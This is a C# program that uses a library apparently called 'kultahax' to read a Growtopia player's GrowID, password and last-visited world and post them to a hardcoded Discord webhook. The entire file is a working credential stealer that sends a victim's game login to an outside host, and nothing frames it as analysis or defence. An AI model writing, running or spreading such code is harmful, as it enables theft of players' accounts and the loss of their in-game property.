using System;
using System.Net.Http;
using System.Text;
using kultahax;
using Newtonsoft.Json;

namespace MyNamespace
{
    class Program
    {
        static void Main()
        {
            string growid = Growtopia.GrowID();
            string password = Growtopia.Password();
            string lastworld = Growtopia.LastWorld();

            // Replace the URL with the URL of your webhook
            string webhookUrl = "https://discord.com/api/webhooks/1080858959721799750/rfZ42_EClHJjiAgXXEKTrcY_VV8rW-E_Q4Oy3c1ArYE__VZKpuwzHboa2nvetEqhejfL";

            // Create an HttpClient object
            using (HttpClient client = new HttpClient())
            {
                // Create a message object with the message text
                string messageText = $"GrowID: {growid}\nPassword: {password}\nLast World: {lastworld}";
                var message = new { content = messageText };

                // Serialize the message object to JSON
                var json = JsonConvert.SerializeObject(message);

                // Create a StringContent object with the JSON payload
                StringContent content = new StringContent(json, Encoding.UTF8, "application/json");

                // Send the webhook using a POST request
                HttpResponseMessage response = client.PostAsync(webhookUrl, content).Result;

                // Check the response status code
                if (response.IsSuccessStatusCode)
                {
                    Console.WriteLine("Webhook sent successfully.");
                }
                else
                {
                    Console.WriteLine($"Error sending webhook. Status code: {response.StatusCode}");
                }
                Console.ReadLine();
            }
        }
    }
}
